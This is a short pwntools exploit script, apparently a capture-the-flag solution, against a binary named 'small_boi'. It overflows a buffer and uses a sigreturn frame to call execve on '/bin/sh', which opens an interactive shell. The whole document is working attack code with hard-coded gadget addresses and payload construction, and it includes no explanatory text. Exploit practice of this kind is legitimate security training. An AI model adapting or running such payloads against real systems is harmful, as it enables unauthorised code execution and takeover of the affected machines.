addr_shell = 0x4001ca
'''
strings -tx small_boi | grep /bin/sh
pwndbg> x/s 0x4001ca
0x4001ca:   "/bin/sh"
'''

from pwn import *

context.arch = "amd64"
p = process("./small_boi")
gdb.attach(p)

frame = SigreturnFrame(kernel='amd64')	# struct Sigcontext
# print len(frame)		# len frame = 248
frame.rax = 0x3b		      # execve syscall number
frame.rdi = addr_shell		# address of /bin/sh string
frame.rip = 0x400185		   # syscall gadget
print len(frame)		# len frame = 248

'''
   0x400180:	mov    eax,0xf
   0x400185:	syscall 
'''
SROP_gadgets = 0x400180

payload = ""
payload += "A" * 0x28		    # offset
payload += p64(SROP_gadgets)	 # invoke SROP
payload += bytes(frame)	       # append sigcontext

# print len(payload)
p.sendline(payload)
p.interactive()
